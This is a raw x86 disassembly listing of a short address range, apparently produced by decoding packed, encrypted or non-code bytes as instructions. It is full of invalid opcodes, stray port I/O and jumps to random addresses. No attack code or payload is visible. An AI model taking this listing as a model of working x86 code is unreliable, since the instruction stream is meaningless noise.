  40f9be:	in     eax,0x59
  40f9c0:	jmp    0x3eeb:0x3f411f51
  40f9c7:	in     eax,0x13
  40f9c9:	cmp    DWORD PTR [edx],esp
  40f9cb:	mov    ebp,0xb0a32927
  40f9d0:	push   cs
  40f9d1:	loope  0x40f9d9
  40f9d3:	or     BYTE PTR [eax],al
  40f9d5:	bound  eax,QWORD PTR [ebx-0x4c16f589]
  40f9db:	clc    
  40f9dc:	inc    edx
  40f9dd:	fdivr  DWORD PTR [esi+0x2]
  40f9e0:	and    al,0x72
  40f9e2:	jnp    0x40f969
  40f9e4:	dec    edi
  40f9e5:	push   edx
  40f9e6:	jb     0x40f9e9
  40f9e8:	mov    ebx,DWORD PTR [esi]
  40f9ea:	fxch   st(3)
  40f9ec:	pop    ss
  40f9ed:	and    dl,BYTE PTR [edx+0x23]
  40f9f0:	call   0xc1ea9a46
  40f9f5:	add    BYTE PTR [ebp+0x6de82350],dh
  40f9fb:	push   eax
  40f9fc:	jae    0x40f9e5
  40f9fe:	dec    ebp
  40f9ff:	(bad)  
  40fa01:	add    ecx,DWORD PTR [ecx+0xd]
  40fa04:	int3   
  40fa05:	jecxz  0x40fa73
  40fa07:	pop    ebp
  40fa08:	repnz and dh,BYTE PTR [esp+eiz*2+0x6a]
  40fa0d:	mov    edi,0x10e7bd41
  40fa12:	fcomip st,st(0)
  40fa14:	loope  0x40fa19
  40fa16:	bound  ebx,QWORD PTR [eax+0x27]
  40fa19:	cmp    eax,0x180c04ea
  40fa1e:	loope  0x40fa80
  40fa20:	out    dx,al
  40fa21:	adc    ch,bl
  40fa23:	or     al,0xe2
  40fa25:	add    esp,DWORD PTR [edx+0x64]
  40fa28:	add    eax,DWORD PTR [edi+0x3a76392]
  40fa2e:	fst    DWORD PTR [ebx]
  40fa30:	mov    esp,?
  40fa32:	or     dl,ah
  40fa34:	push   0x7d
  40fa36:	sbb    eax,0x9484e764
  40fa3b:	shl    edi,0xb7
  40fa3e:	imul   edx,DWORD PTR [eax-0x6a],0x1b
  40fa42:	lods   al,BYTE PTR ds:[esi]
  40fa43:	push   esi
  40fa44:	scas   al,BYTE PTR es:[edi]
  40fa45:	pop    ds
  40fa46:	xchg   edx,eax
  40fa47:	or     ah,BYTE PTR [ebx+0x4c]
  40fa4a:	std    
  40fa4b:	dec    ebp
  40fa4c:	adc    eax,DWORD PTR ds:0xb9a75e62
  40fa52:	xor    eax,0x6de83b50
  40fa57:	jo     0x40fa46
  40fa59:	jmp    0x545d:0x2c52400
  40fa60:	int3   
  40fa61:	jno    0x40fa66
  40fa63:	mov    BYTE PTR [ecx+eax*1],bl
  40fa66:	add    eax,0xa931d3fb
  40fa6b:	sahf   
  40fa6c:	mov    al,ds:0xc7ea0545
  40fa71:	mov    ch,BYTE PTR [edx]
  40fa73:	pop    edi
  40fa74:	lahf   
  40fa75:	inc    ebp
  40fa76:	(bad)  
  40fa77:	aad    0xcf
  40fa79:	inc    ecx
  40fa7a:	sub    esp,edi
  40fa7c:	pop    es
  40fa7d:	and    eax,0x250788d9
  40fa82:	leave  
  40fa83:	lds    ebp,FWORD PTR [esi]
  40fa85:	mov    DWORD PTR [ebp-0x76],esp
  40fa88:	mov    ds:0x5861e8ff,eax
  40fa8d:	jl     0x40fa9c
  40fa8f:	jle    0x40faf4
  40fa91:	push   cs
  40fa92:	xor    BYTE PTR fs:[ebp+edi*8+0x24ff5956],al
  40fa9a:	cmc    
  40fa9b:	fs push edi
  40fa9d:	cdq    
  40fa9e:	mul    BYTE PTR [ecx-0x27]
  40faa1:	mov    DWORD PTR [ebp+0x3a],esp
  40faa4:	(bad)  
  40faa5:	(bad)  
  40faa6:	call   0xa5c9140c
  40faab:	cmp    eax,0x6cbf50a7
  40fab0:	es and al,0xbd
  40fab3:	pop    esi
  40fab4:	fld    DWORD PTR [eax]
  40fab6:	bound  edi,QWORD PTR [ebx+0x35c5b463]
  40fabc:	fiadd  DWORD PTR [eax]
  40fabe:	jmp    0xb4a52ec3
  40fac3:	lds    esp,FWORD PTR ds:0x3ce900da
  40fac9:	es and al,0x8d
  40facc:	pop    esi
  40facd:	fld    DWORD PTR [eax]
  40facf:	cmp    cl,bl
  40fad1:	(bad)
  40fad5:	arpl   bp,di
  40fad7:	and    ch,bl
  40fad9:	and    cl,BYTE PTR ds:0xd6d464
  40fadf:	add    BYTE PTR [ebx+0x7b24894f],bh
  40fae5:	fadd   QWORD PTR [eax]
  40fae7:	add    BYTE PTR [eax-0x66],al
  40faea:	and    DWORD PTR [eax+esi*4],esi
  40faed:	and    BYTE PTR [ecx],0x14
  40faf0:	dec    eax
  40faf1:	pop    eax
  40faf2:	call   0x117af3e
  40faf7:	xor    DWORD PTR [ecx+ebx*4-0x3],0xffffff8a
  40fafc:	aaa    
  40fafd:	jp     0x40fb3c
  40faff:	add    DWORD PTR [ebx-0x2a],edi
  40fb02:	je     0x40fa8e
  40fb04:	mov    al,ds:0xb8867405
  40fb09:	push   ss
  40fb0a:	mov    DWORD PTR ds:[ecx+edi*2],edi
  40fb0e:	cmp    BYTE PTR [edi-0x79],al
  40fb11:	ror    DWORD PTR [ebp-0x15cea1b],cl
  40fb17:	jmp    0x3f9e55
  40fb1c:	rcl    BYTE PTR [edx-0x642fdfdf],0x69
  40fb23:	sub    eax,DWORD PTR [eax]
  40fb25:	xchg   ecx,eax
  40fb26:	outs   dx,DWORD PTR ds:[esi]
  40fb27:	ret    0x833b
  40fb2a:	sub    al,0x4
  40fb2c:	mov    esp,esp
  40fb2e:	xor    edx,ebp
  40fb30:	(bad)  
  40fb31:	cmp    BYTE PTR ds:0xa34450e9,al
  40fb37:	dec    BYTE PTR [ebx-0x14e28639]
  40fb3d:	enter  0x5e5e,0x6c
  40fb41:	mov    cl,ah
  40fb43:	push   cs
  40fb44:	mov    dh,0xf8
  40fb46:	push   esi
  40fb47:	cmc    
  40fb48:	or     eax,0x3b41cd7e
  40fb4d:	in     al,0x31
  40fb4f:	push   cs
  40fb50:	or     DWORD PTR [eax-0x5c],0xfffffffe
  40fb54:	(bad)  
  40fb55:	jnp    0x40fbb7
  40fb57:	pop    es
  40fb58:	jne    0x40fbbc
  40fb5a:	shl    BYTE PTR [edi],cl
  40fb5c:	and    ah,cl
  40fb5e:	xchg   DWORD PTR [edx],ecx
  40fb60:	je     0x40fbce
  40fb62:	fnstenv [ebx+0x1efd555f]
  40fb68:	(bad)  
  40fb69:	mov    ebp,0x69f77f2a
  40fb6e:	lods   al,BYTE PTR ds:[esi]
  40fb6f:	adc    al,0x83
  40fb71:	stos   BYTE PTR es:[edi],al
  40fb72:	imul   esi,DWORD PTR [ebp+0x4fd670a],0x0
  40fb79:	bound  edi,QWORD PTR [ebx-0x7a]
  40fb7c:	or     BYTE PTR [ebp+0x20423b52],dl
  40fb82:	xchg   edi,eax
  40fb83:	push   edx
  40fb84:	jnp    0x40fb51
  40fb86:	dec    eax
  40fb87:	ds std 
  40fb89:	add    BYTE PTR [ebp-0x16],bh
  40fb8c:	xchg   DWORD PTR [ebx+0x3e],ecx
  40fb8f:	nop
  40fb90:	sub    BYTE PTR [edx],ch
  40fb92:	sub    DWORD PTR [ebx+0x22e10ead],ebx
  40fb98:	cmp    al,0xfe
  40fb9a:	pop    ebp
  40fb9b:	js     0x40fc10
  40fb9d:	add    ah,cl
  40fb9f:	or     cl,BYTE PTR [edx]
  40fba1:	(bad)  
  40fba3:	adc    edi,DWORD PTR [edi]
  40fba5:	inc    BYTE PTR [ebp-0xc]
  40fba8:	cmp    al,0x1f
  40fbaa:	ins    DWORD PTR es:[edi],dx
  40fbab:	out    dx,al
  40fbac:	pop    edx
  40fbad:	std    
  40fbae:	xor    eax,0x629ffdb0
  40fbb3:	jb     0x40fbb6
  40fbb5:	pmaxub mm5,QWORD PTR [edi+0x341dfe3e]
  40fbbc:	mov    edi,0x524f333a
  40fbc1:	call   0xfe7cd4ec
  40fbc6:	fldcw  WORD PTR [esi]
  40fbc8:	in     eax,0x1f
  40fbca:	or     DWORD PTR [eax+edi*8-0x7f8079a2],edx
  40fbd1:	and    al,0xed
  40fbd3:	(bad)  
  40fbd5:	cmp    al,0x54
  40fbd7:	daa    
  40fbd8:	jmp    0xe114:0x5bd2d580
  40fbdf:	popa   
  40fbe0:	pop    es
  40fbe1:	mov    eax,0x3879e58
  40fbe6:	(bad)  
  40fbe7:	fldz   
  40fbe9:	xchg   dh,bl
  40fbeb:	pop    edi
  40fbec:	mov    dh,0x3c
  40fbee:	add    BYTE PTR [eax],ah
  40fbf0:	sbb    esi,ebx
  40fbf2:	push   edx
  40fbf3:	sub    DWORD PTR [edx+0x60a79190],eax
  40fbf9:	sahf   
  40fbfa:	mov    BYTE PTR [ecx],ch
  40fbfc:	mov    ch,0xc7
  40fbfe:	sub    BYTE PTR [esi-0x5c],dl
  40fc01:	cs mov al,0x5c
  40fc04:	pop    esp
  40fc05:	jp     0x40fc44
  40fc07:	test   BYTE PTR [eax-0x12],ah
  40fc0a:	jne    0x40fc6c
  40fc0c:	pop    esp
  40fc0d:	outs   dx,DWORD PTR ds:[esi]
  40fc0e:	or     DWORD PTR [ebp+0x55],esp
  40fc11:	idiv   BYTE PTR ds:0x3b6a606c
  40fc17:	pop    eax
  40fc18:	shl    BYTE PTR [ebx-0x53],1
  40fc1b:	pop    edi
  40fc1c:	pusha  
  40fc1d:	push   esi
  40fc1e:	or     BYTE PTR [ebp-0x33],0xde
  40fc22:	xchg   esi,eax
  40fc24:	pop    edi
  40fc25:	inc    esi
  40fc26:	cmp    al,0xe0
  40fc28:	pusha  
  40fc29:	in     al,dx
  40fc2a:	or     al,0xe6
  40fc2c:	cld    
  40fc2d:	xor    eax,0x649e343c
  40fc32:	add    esp,DWORD PTR [edx-0x27]
  40fc35:	test   BYTE PTR [edi+0x3c1e5f92],0xa0
  40fc3c:	sbb    edx,ebx
  40fc3e:	push   edx
  40fc3f:	cdq    
  40fc40:	and    BYTE PTR [eax],al
  40fc42:	lds    ecx,FWORD PTR [edi]
  40fc44:	pusha  
  40fc45:	push   es
  40fc46:	mov    BYTE PTR [ecx+0x4e28c7b5],bl
  40fc4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc4d:	add    BYTE PTR [esi+0x4681cec5],dl
  40fc53:	add    BYTE PTR [edi],ch
  40fc55:	pop    edi
  40fc56:	std    
  40fc57:	div    BYTE PTR [ebx-0x25]
  40fc5a:	and    ecx,0x6a1ae56c
  40fc60:	xchg   esi,eax
  40fc61:	shl    DWORD PTR [esp+esi*8-0x1c],cl
  40fc65:	addr16 or al,0x3d
  40fc68:	outs   dx,BYTE PTR ds:[esi]
  40fc69:	pop    esp
  40fc6a:	clc    
  40fc6b:	in     al,dx
  40fc6c:	or     eax,0x5e6c3bd3
  40fc71:	fld    DWORD PTR [eax]
  40fc73:	fsubrp st(2),st
  40fc75:	(bad)  
  40fc76:	(bad)  
  40fc77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc78:	imul   ebx,DWORD PTR [ebx],0xe436e243
  40fc7e:	int    0x80
  40fc80:	fs pop edi
  40fc82:	std    
  40fc83:	mov    cs,WORD PTR [ebp-0x23099302]
  40fc89:	call   0xcf7a7b8c
  40fc8e:	mov    dh,0xe2
  40fc90:	in     al,0x16
  40fc92:	xor    eax,0x4da6277
  40fc97:	mul    dl
  40fc99:	push   0x1b995efb
  40fc9e:	inc    ebx
  40fc9f:	adc    dh,BYTE PTR [edx]
  40fca1:	mov    ebx,0x71a8cd20
  40fca6:	in     al,0x44
  40fca8:	mov    DWORD PTR [edi+0x39],ebx
  40fcab:	sahf   
  40fcac:	add    eax,0x7ba281d0
  40fcb1:	pop    edi
  40fcb2:	std    
  40fcb3:	fidiv  WORD PTR [ebx+0xae89d3]
  40fcb9:	xor    eax,0x1de80465
  40fcbe:	rol    BYTE PTR [edx+eiz*1-0x5502a0a5],1
  40fcc5:	daa    
  40fcc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcc7:	push   esp
  40fcc8:	add    BYTE PTR [edi],dl
  40fcca:	jnp    0x40fd45
  40fccc:	fist   WORD PTR [edx-0x1d]
  40fccf:	cld    
  40fcd0:	(bad)  
  40fcd1:	in     al,dx
  40fcd2:	pop    edi
  40fcd3:	pop    esi
  40fcd4:	ins    BYTE PTR es:[edi],dx
  40fcd5:	or     al,0x58
  40fcd7:	and    al,0xfe
  40fcd9:	cld    
  40fcda:	mov    ds:0x4fd0b60e,eax
  40fcdf:	inc    esi
  40fce0:	xor    al,0xb5
  40fce2:	pop    esi
  40fce3:	add    BYTE PTR [ecx],al
  40fce5:	lods   al,BYTE PTR ds:[esi]
  40fce6:	pop    ecx
  40fce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fce8:	std    
  40fce9:	pushf  
  40fcea:	mov    ds:0x89604242,eax
  40fcef:	and    DWORD PTR [eax],esp
  40fcf1:	outs   dx,DWORD PTR ds:[esi]
  40fcf2:	add    ch,cl
  40fcf4:	cwde   
  40fcf5:	(bad)  
  40fcf6:	mov    ds:0x311c3bfe,eax
  40fcfb:	push   cs
  40fcfc:	cmp    esp,0xffffffa1
  40fcff:	(bad)  
  40fd00:	(bad)  
  40fd01:	jl     0x40fceb
  40fd03:	or     cl,BYTE PTR [ebx+0x4f36944]
  40fd09:	jp     0x40fce0
  40fd0b:	or     eax,0xfea17c84
  40fd10:	dec    DWORD PTR [eax-0x69]
  40fd13:	cmp    dl,BYTE PTR [edi+eiz*4+0x7a]
  40fd17:	jns    0x40fcf8
  40fd19:	adc    ah,BYTE PTR [esp+edi*8]
  40fd1c:	inc    DWORD PTR [eax]
  40fd1e:	mov    esp,0x3c6c5e5f
  40fd23:	push   edi
  40fd24:	fdivr  st,st(5)
  40fd26:	pushf  
  40fd27:	mov    ds:0x4f50b60e,eax
  40fd2c:	inc    esi
  40fd2d:	xor    al,0x75
  40fd2f:	pop    esi
  40fd30:	add    BYTE PTR [eax],dl
  40fd32:	cmp    al,0x59
  40fd34:	pop    eax
  40fd35:	std    
  40fd36:	jl     0x40fcdb
  40fd38:	inc    edx
  40fd39:	inc    edx
  40fd3a:	inc    eax
  40fd3b:	mov    fs,WORD PTR [ecx]
  40fd3d:	and    bh,bh
  40fd3f:	add    ch,cl
  40fd41:	dec    esp
  40fd42:	(bad)  
  40fd43:	lds    edi,FWORD PTR [edx]
  40fd45:	dec    BYTE PTR [ecx+0x2f]
  40fd48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd49:	jb     0x40fdb2
  40fd4b:	outs   dx,DWORD PTR ds:[si]
  40fd4d:	or     ch,cl
  40fd4f:	ss in  eax,dx
  40fd51:	cmc    
  40fd52:	pop    esi
  40fd53:	jno    0x40fd66
  40fd55:	(bad)  
  40fd57:	es cmp dh,bh
  40fd5a:	in     eax,0xb2
  40fd5c:	(bad)  
  40fd5d:	cmp    dh,BYTE PTR [esi]
  40fd5f:	aam    0xe4
  40fd61:	jnp    0x40fd24
  40fd63:	cwde   
  40fd64:	out    dx,al
  40fd65:	cld    
  40fd66:	int    0x8e
  40fd68:	cmp    DWORD PTR [esi+0x46],0x70
  40fd6c:	or     BYTE PTR [edx+eax*4-0x1601c8e3],al
  40fd73:	repz loopne 0x40fdb5
  40fd76:	arpl   WORD PTR [eax+0x1],si
  40fd79:	jmp    0xfe783251
  40fd7e:	ins    DWORD PTR es:[edi],dx
  40fd7f:	push   es
  40fd80:	mov    BYTE PTR [ebx],0x0
  40fd83:	gs (bad) 
  40fd85:	mov    ebp,0x334e104
  40fd8a:	jmp    0x40fde6
  40fd8c:	outs   dx,DWORD PTR ds:[si]
  40fd8e:	dec    esp
  40fd8f:	arpl   WORD PTR [edi+0x6f],bp
  40fd92:	inc    esp
  40fd93:	pusha  
  40fd94:	xor    DWORD PTR [ecx],esp
  40fd96:	pop    es
  40fd97:	pop    ecx
  40fd98:	cmp    BYTE PTR [ebx],al
  40fd9a:	jmp    0x54427281
  40fd9f:	(bad)  
  40fda0:	pop    es
  40fda1:	test   ah,al
  40fda3:	popa   
  40fda4:	out    dx,eax
  40fda5:	mov    eax,0x8a8f7623
  40fdaa:	imul   edi,DWORD PTR [esi+0x76],0x8
  40fdae:	test   ah,ah
  40fdb0:	jno    0x40fdb3
  40fdb2:	add    bl,ch
  40fdb4:	fsubrp st(0),st
  40fdb6:	push   edi
  40fdb7:	arpl   WORD PTR [edx+0x1],si
  40fdba:	jmp    0x429d746
  40fdbf:	(bad)  
  40fdc0:	out    dx,eax
  40fdc1:	jmp    0x5b9da3a1
  40fdc6:	loopne 0x40fd71
  40fdc8:	(bad)  
  40fdca:	add    ebx,ecx
  40fdcc:	nop
  40fdcd:	push   es
  40fdce:	jo     0x40fe11
  40fdd0:	std    
  40fdd1:	call   0xf7455fd9
  40fdd6:	outs   dx,DWORD PTR ds:[esi]
  40fdd7:	inc    ecx
  40fdd8:	std    
  40fdd9:	call   0x9b9d5fe1
  40fdde:	fistp  QWORD PTR [ecx]
  40fde0:	(bad)  
  40fde2:	add    esi,DWORD PTR [eax]
  40fde4:	push   eax
  40fde5:	cmp    esp,eax
  40fde7:	add    BYTE PTR [ecx-0x3ba9038f],dl
  40fded:	pop    esp
  40fdee:	ins    BYTE PTR es:[edi],dx
  40fdef:	inc    ebx
  40fdf0:	ins    BYTE PTR es:[edi],dx
  40fdf1:	push   esi
  40fdf2:	inc    DWORD PTR [edx]
  40fdf4:	(bad)  
  40fdf5:	fldenv [edx-0x59]
  40fdf8:	sub    DWORD PTR [ebp+0x5cbf82c0],0x259cd2a6
  40fe02:	ret    
  40fe03:	xlat   BYTE PTR ds:[ebx]
  40fe04:	(bad)  
  40fe05:	(bad)  
  40fe07:	mov    WORD PTR [eax+0x21e0135c],ds
  40fe0d:	add    al,0x87
  40fe0f:	outs   dx,DWORD PTR ds:[esi]
  40fe10:	inc    ecx
  40fe11:	std    
  40fe12:	call   0x3b9d601a
  40fe17:	fisttp WORD PTR [ecx]
  40fe19:	(bad)  
  40fe1b:	add    esp,DWORD PTR [ebp+0x25]
  40fe1e:	or     ebx,eax
  40fe20:	(bad)  
  40fe21:	(bad)  
  40fe23:	sub    edx,DWORD PTR [eax+0x7d]
  40fe26:	push   esi
  40fe27:	cmp    dh,ah
  40fe29:	cwde   
  40fe2a:	fidivr WORD PTR [esi+0x47]
  40fe2d:	(bad)  
  40fe2f:	add    esp,ecx
  40fe31:	xchg   ebp,eax
  40fe32:	jmp    0x6a36:0x739d2a
  40fe39:	retf   
  40fe3a:	mov    dh,0x9c
  40fe3c:	pop    esi
  40fe3d:	int3   
  40fe3e:	mov    dh,0xac
  40fe40:	sbb    eax,0x66f1df99
  40fe45:	xchg   ecx,eax
  40fe46:	xchg   DWORD PTR [ebp-0x1a744fd3],esp
  40fe4c:	add    BYTE PTR [eax-0x60],bl
  40fe4f:	inc    ebp
  40fe50:	(bad)  [edx+0x4d]
  40fe53:	add    dh,cl
  40fe55:	popa   
  40fe56:	fld    DWORD PTR [ecx+0x40d4d]
  40fe5c:	jmp    0x9f4ed7c2
  40fe61:	stos   DWORD PTR es:[edi],eax
  40fe62:	fadd   DWORD PTR [ecx-0x6bb1001d]
  40fe68:	or     eax,0xe900d8ae
  40fe6d:	sti    
  40fe6e:	fstp   DWORD PTR [eax-0xa]
  40fe71:	stos   BYTE PTR es:[edi],al
  40fe72:	mov    ecx,DWORD PTR ds:0xbfd9a377
  40fe78:	enter  0xd05e,0xc8
  40fe7c:	pusha  
  40fe7d:	shl    BYTE PTR [edi-0x269e17a8],cl
  40fe83:	sbb    ch,0x86
  40fe86:	pop    es
  40fe87:	je     0x40fea0
  40fe89:	fst    DWORD PTR [edi+0x24]
  40fe8c:	sub    eax,0x2900d95f
  40fe91:	out    dx,eax
  40fe92:	pop    ss
  40fe93:	and    eax,0xb6ca91d5
  40fe98:	sub    al,0x66
  40fe9a:	pop    es
  40fe9b:	(bad)  
  40fe9c:	xor    eax,0xe8ffff82
  40fea1:	popa   
  40fea2:	retf   0x79b6
  40fea5:	dec    BYTE PTR [ebx]
  40fea7:	inc    ecx
  40fea8:	jmp    0xad652541
  40fead:	pop    esi
  40feae:	fld    DWORD PTR [eax]
  40feb0:	add    BYTE PTR [eax],al
  40feb2:	dec    eax
  40feb3:	or     dl,BYTE PTR [edi-0x1]
  40feb6:	scas   eax,DWORD PTR es:[edi]
  40feb7:	jns    0x40ff12
  40feb9:	add    DWORD PTR [ebx],edi
  40febb:	xlat   BYTE PTR ds:[ebx]
  40febc:	mov    ebx,ecx
  40febe:	je     0x40fea9
  40fec0:	and    DWORD PTR [edx+ecx*1-0x29],ebx
  40fec4:	add    bh,bh
  40fec6:	scas   eax,DWORD PTR es:[edi]
  40fec7:	jns    0x40ff22
  40fec9:	add    ebx,edi
  40fecb:	(bad)  
  40fecc:	call   0xfee3361f
  40fed1:	test   DWORD PTR [ebx+0x29],ecx
  40fed4:	push   es
  40fed5:	cmp    eax,0xfffea315
  40feda:	outs   dx,BYTE PTR ds:[esi]
  40fedb:	mov    WORD PTR [esi],cs
  40fedd:	mov    dh,0xc6
  40fedf:	aad    0xd
  40fee1:	mov    dh,0x8e
  40fee3:	xlat   BYTE PTR ds:[ebx]
  40fee4:	mov    DWORD PTR [edi+ebx*2-0x44ffff83],edx
  40feeb:	adc    eax,0xec008e1
  40fef0:	add    ebp,ecx
  40fef2:	mov    ah,0xec
  40fef4:	dec    esp
  40fef5:	add    esp,eax
  40fef7:	in     al,dx
  40fef8:	inc    esp
  40fef9:	add    bh,dl
  40fefb:	mov    ch,0x5
  40fefd:	or     eax,DWORD PTR [ebx]
  40feff:	push   eax
  40ff00:	inc    ecx
  40ff01:	and    al,0x9f
  40ff03:	push   esi
  40ff04:	cmp    DWORD PTR [ecx],ebp
  40ff06:	dec    edi
  40ff07:	sub    DWORD PTR [ebx-0x7c2c367b],ecx
  40ff0d:	push   esi
  40ff0e:	adc    esi,0x0
  40ff11:	(bad)  
  40ff13:	cdq    
  40ff14:	std    
  40ff15:	push   cs
  40ff16:	add    BYTE PTR ds:0x3b4f5d56,ch
  40ff1c:	aad    0x1
  40ff1e:	call   0x1c623125
  40ff23:	rcr    BYTE PTR [ebx+0x3a],1
  40ff26:	inc    edi
  40ff27:	aas    
  40ff28:	rol    DWORD PTR [edx+0x36a46228],cl
  40ff2e:	inc    BYTE PTR [ebp+0x73]
  40ff31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff32:	neg    DWORD PTR [edx-0x66a32ccd]
  40ff38:	icebp  
  40ff39:	cmp    eax,0x170632b
  40ff3e:	ret    0x7082
  40ff41:	mov    al,BYTE PTR [ebx+0x49446]
  40ff47:	bound  esi,QWORD PTR [eax]
  40ff49:	shr    DWORD PTR [ecx+0x60],1
  40ff4c:	sub    cl,dl
  40ff4e:	dec    dh
  40ff50:	xchg   ebx,eax
  40ff51:	aad    0x0
  40ff53:	bound  esi,QWORD PTR [eax-0x76]
  40ff56:	aam    0xf5
  40ff58:	mov    ds:0x70635bdd,eax
  40ff5d:	add    DWORD PTR [edi-0x1b],edx
  40ff60:	mov    ds:0x70635bdd,eax
  40ff65:	add    DWORD PTR [ebx+0x23707aa9],ecx
  40ff6b:	cs jno 0x40ff6f
  40ff6e:	add    ch,al
  40ff70:	inc    ebx
  40ff71:	loopne 0x40ffce
  40ff73:	arpl   WORD PTR [eax+0x1],si
  40ff76:	call   0xfe743677
  40ff7b:	add    BYTE PTR [ecx+0x2fd8f7da],bh
  40ff81:	mov    edi,edx
  40ff83:	jbe    0x40ffbb
  40ff85:	arpl   WORD PTR [esi-0x36],di
  40ff88:	pop    ebp
  40ff89:	jo     0x40ff8c
  40ff8b:	cmp    DWORD PTR ds:0xd910b0a8,edx
  40ff91:	repnz mov edi,?
  40ff94:	jge    0x410005
  40ff96:	add    BYTE PTR [edi+0xa],al
  40ff99:	xchg   edi,eax
  40ff9a:	dec    ecx
  40ff9b:	push   cs
  40ff9c:	out    0x9c,al
  40ff9e:	sti    
  40ff9f:	jmp    DWORD PTR [ebp-0xa]
  40ffa2:	and    BYTE PTR [ebx],0xaa
  40ffa5:	fld1   
  40ffa7:	add    esp,DWORD PTR [edx+0x62]
  40ffaa:	data16 test BYTE PTR [ebp+0x59],cl
  40ffae:	out    0x88,eax
  40ffb0:	loope  0x40ffaf
  40ffb2:	mov    ds:0x70d96202,eax
  40ffb7:	jge    0x40ff92
  40ffb9:	(bad)  
  40ffbb:	add    edi,DWORD PTR [eax-0x4a3a9f26]
  40ffc1:	pop    esi
  40ffc2:	sbb    DWORD PTR [edx+edi*2+0x55],edi
  40ffc6:	es xor eax,0xafbe62ba
  40ffcc:	pop    esp
  40ffcd:	popf   
  40ffce:	sub    BYTE PTR [ebx],ch
  40ffd0:	sbb    DWORD PTR [eax+0xe],0x35
  40ffd4:	call   0xf51a0ff3
  40ffd9:	pop    eax
  40ffda:	dec    BYTE PTR [eax+0x293fde1]
  40ffe0:	add    BYTE PTR [edx-0x27],ah
  40ffe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe4:	shl    DWORD PTR [ebx],cl
  40ffe6:	pop    eax
  40ffe7:	fistp  QWORD PTR [ecx]
  40ffea:	(bad)  
  40ffec:	add    ebx,ecx
  40ffee:	lods   eax,DWORD PTR ds:[esi]
  40ffef:	or     ebx,DWORD PTR [eax]
  40fff1:	(bad)
  40fff4:	ror    dl,0xc0
  40fff7:	(bad)  
  40fff8:	xor    al,0xb4
  40fffa:	fs arpl di,bx
  40fffd:	and    eax,0xdb03e7da
  410002:	pusha  
  410003:	add    esp,DWORD PTR [bp+si-0x27]
  410007:	jb     0x410088
  410009:	inc    ecx
  41000a:	cdq    
  41000b:	call   0x36a36213
  410010:	mov    al,0xda
  410012:	mov    al,ds:0xe5e82b17
  410017:	out    0x3,eax
  410019:	jmp    0x2b54c3bb
  41001e:	popf   
  41001f:	add    ch,cl
  410021:	jns    0x41000a
  410023:	mov    edi,DWORD PTR [edi+0x6600d96b]
  410029:	vmovmskps ebp,ymm0
  41002d:	popa   
  41002e:	(bad)  [ecx+0x55f425a5]
  410034:	dec    esi
  410035:	or     eax,0x92722cfc
  41003a:	inc    eax
  41003b:	test   BYTE PTR [ebx],ah
  41003d:	jbe    0x410096
  41003f:	sub    DWORD PTR [ecx],0x5e
  410042:	pop    ebp
  410043:	add    ch,al
  410045:	add    BYTE PTR [ecx-0x27],ah
  410048:	add    ebp,eax
  41004a:	xor    eax,0x2d6589fc
  41004f:	mov    ah,0xff
  410051:	call   0xc58558b7
  410056:	or     DWORD PTR [eax],ebx
  410058:	push   ecx
  410059:	lahf   
  41005a:	mov    WORD PTR cs:[ebx*4+0x6200d960],fs
  410062:	xchg   esp,eax
  410063:	push   edi
  410064:	mov    ah,0xc5
  410066:	mov    ch,0xd8
  410068:	add    cl,ch
  41006a:	push   esp
  41006b:	and    edx,DWORD PTR [ebp-0x22]
  41006e:	dec    edx
  41006f:	cld    
  410070:	pop    esp
  410071:	call   0x963ed9d7
  410076:	retf   0xffb3
  410079:	call   0x5f558df
  41007e:	xchg   edx,eax
  41007f:	fadd   DWORD PTR [eax]
  410081:	jmp    0xaf1b77cf
  410086:	push   ecx
  410087:	pop    ebp
  410088:	rcr    BYTE PTR ds:0x9fa740ee,0x51
  41008f:	push   edi
  410090:	xchg   DWORD PTR ds:0xa139eb7a,esi
  410096:	mov    bl,0xb3
  410098:	std    
  410099:	add    BYTE PTR [edi],dh
  41009b:	inc    ecx
  41009c:	dec    ebp
  41009d:	add    DWORD PTR [ebx-0x25],edi
  4100a0:	mov    DWORD PTR [edi+edx*4-0x19],ecx
  4100a4:	push   ebp
  4100a5:	push   edx
  4100a6:	shr    BYTE PTR [esi-0x5effe71b],0xa
  4100ad:	inc    DWORD PTR [ebp-0x74e96e85]
  4100b3:	pop    es
  4100b4:	aas    
  4100b5:	and    DWORD PTR [ebx+0x3253f07],ecx
  4100bb:	sbb    DWORD PTR ds:0x35674488,0xed57443a
  4100c5:	jl     0x41009a
  4100c7:	mov    al,ds:0xbf7f823e
  4100cc:	fidiv  DWORD PTR [ebp+ebx*1+0x0]
  4100d0:	sub    al,0x69
  4100d2:	jb     0x4100e7
  4100d4:	dec    eax
  4100d5:	cdq    
  4100d6:	and    al,0xcb
  4100d8:	fld    QWORD PTR [eax]
  4100da:	add    BYTE PTR [ebp-0x25],dh
  4100dd:	xor    eax,eax
  4100df:	mov    ebx,0xb25c46d5
  4100e4:	and    edi,DWORD PTR [ecx+0xf]
  4100e7:	cmp    al,0x36
  4100e9:	call   0x5988bded
  4100ee:	and    al,0xd7
  4100f0:	fild   DWORD PTR [edx+0xdac263]
  4100f6:	mov    eax,DWORD PTR [edi+0x3e]
  4100f9:	pop    ecx
  4100fa:	add    ebx,ecx
  4100fc:	fiadd  DWORD PTR [eax-0x77]
  4100ff:	xchg   DWORD PTR [ecx+0x31],eax
  410102:	push   eax
  410103:	inc    ebp
  410104:	or     dh,BYTE PTR [edx+0xdc6f24]
  41010a:	add    BYTE PTR [eax],dl
  41010c:	mov    cl,0xfe
  41010e:	mov    ah,0x0
  410110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410111:	add    BYTE PTR es:[eax],al
  410114:	bound  eax,QWORD PTR [eax+0x7e]
  410117:	retf   0x6715
  41011a:	jne    0x41013f
  41011c:	push   ss
  41011d:	inc    ecx
  41011e:	add    DWORD PTR [eax],eax
  410120:	ins    DWORD PTR es:[edi],dx
  410121:	or     al,0xe6
  410123:	pop    ebx
  410124:	arpl   WORD PTR [eax+0x1],ax
  410127:	call   DWORD PTR [esi]
  410129:	sbb    al,0xcd
